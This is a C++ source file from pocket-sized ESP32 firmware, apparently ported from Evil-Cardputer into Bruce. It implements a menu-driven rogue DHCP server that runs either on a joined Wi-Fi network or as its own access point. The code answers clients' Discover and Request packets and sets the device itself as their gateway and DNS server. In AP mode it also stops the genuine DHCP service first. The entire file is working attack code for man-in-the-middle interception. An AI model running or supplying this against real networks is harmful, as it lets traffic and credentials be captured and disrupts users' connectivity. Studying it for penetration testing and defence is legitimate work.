/*
 * Ported from Evil-Cardputer (Evil-M5Project) by 7h30th3r0n3.
 * Rogue DHCP STA/AP: answer Discover/Request on UDP 67.
 * Combined firmware: AGPL-3.0-or-later (Bruce).
 */
#include "rogue_dhcp.h"
#if defined(EVIL_EXTENSIONS)
#include "root/net/wifi_common.h"
#include "root/ui/display.h"
#include "esp_netif.h"
#include <WiFi.h>
#include <WiFiUdp.h>
#include <globals.h>

namespace {

uint8_t dhcpMsgType(const uint8_t *p, int n) {
    if (n < 244) return 0;
    int i = 240;
    while (i < n - 2) {
        if (p[i] == 255) break;
        if (p[i] == 53 && p[i + 1] == 1) return p[i + 2];
        i += 2 + p[i + 1];
    }
    return 0;
}

void sendOfferAck(WiFiUDP &udp, uint8_t *req, int n, uint8_t type, IPAddress server, IPAddress yiaddr) {
    if (n < 244) return;
    req[0] = 2;
    req[16] = yiaddr[0];
    req[17] = yiaddr[1];
    req[18] = yiaddr[2];
    req[19] = yiaddr[3];
    req[20] = server[0];
    req[21] = server[1];
    req[22] = server[2];
    req[23] = server[3];
    int i = 240;
    req[i++] = 53;
    req[i++] = 1;
    req[i++] = type;
    req[i++] = 54;
    req[i++] = 4;
    req[i++] = server[0];
    req[i++] = server[1];
    req[i++] = server[2];
    req[i++] = server[3];
    req[i++] = 1;
    req[i++] = 4;
    req[i++] = 255;
    req[i++] = 255;
    req[i++] = 255;
    req[i++] = 0;
    req[i++] = 3;
    req[i++] = 4;
    req[i++] = server[0];
    req[i++] = server[1];
    req[i++] = server[2];
    req[i++] = server[3];
    req[i++] = 6;
    req[i++] = 4;
    req[i++] = server[0];
    req[i++] = server[1];
    req[i++] = server[2];
    req[i++] = server[3];
    req[i++] = 255;
    udp.beginPacket(IPAddress(255, 255, 255, 255), 68);
    udp.write(req, i);
    udp.endPacket();
}

void runRogue(bool apMode) {
    IPAddress server;
    if (apMode) {
        if (!WiFi.AP.started() && !WiFi.softAPgetStationNum()) {
            wifiConnectMenu(WIFI_AP);
        }
        server = WiFi.softAPIP();
        esp_netif_t *ap = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
        if (ap) esp_netif_dhcps_stop(ap);
    } else {
        if (!WiFi.isConnected()) {
            if (!wifiConnectMenu(WIFI_STA)) return;
        }
        server = WiFi.localIP();
    }

    WiFiUDP udp;
    if (!udp.begin(67)) {
        displayError("UDP :67 failed", true);
        return;
    }
    int offers = 0, acks = 0, suffix = 50;
    drawMainBorderWithTitle(apMode ? "Rogue DHCP AP" : "Rogue DHCP STA");
    tft.drawString(server.toString(), 10, uiStatusY(0));
    tft.drawString("ESC to stop", 10, uiFooterY(FP));
    EscPress = false;
    uint8_t buf[512];

    while (!check(EscPress) && !returnToMenu) {
        int n = udp.parsePacket();
        if (n > 0 && n <= 512) {
            n = udp.read(buf, n);
            uint8_t t = dhcpMsgType(buf, n);
            IPAddress yi(server[0], server[1], server[2], suffix);
            if (t == 1) {
                sendOfferAck(udp, buf, n, 2, server, yi);
                offers++;
            } else if (t == 3) {
                sendOfferAck(udp, buf, n, 5, server, yi);
                acks++;
                suffix = 50 + ((suffix - 49) % 100);
            }
            tft.fillRect(10, 56, tftWidth - 20, 32, kvxConfig.bgColor);
            tft.drawString("Offers " + String(offers) + "  ACKs " + String(acks), 10, uiStatusY(1));
        }
        delay(10);
    }
    udp.stop();
    if (apMode) {
        esp_netif_t *ap = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
        if (ap) esp_netif_dhcps_start(ap);
    }
}

} // namespace

void rogueDhcpSta() { runRogue(false); }
void rogueDhcpAp() { runRogue(true); }

void rogueDhcpMenu() {
    while (true) {
        std::vector<Option> opts = {
            {"Rogue DHCP STA", rogueDhcpSta},
            {"Rogue DHCP AP", rogueDhcpAp},
            {"Back", []() {}},
        };
        int sel = loopOptions(opts, MENU_TYPE_SUBMENU, "Rogue DHCP");
        if (sel < 0 || sel == (int)opts.size() - 1) return;
    }
}
#endif
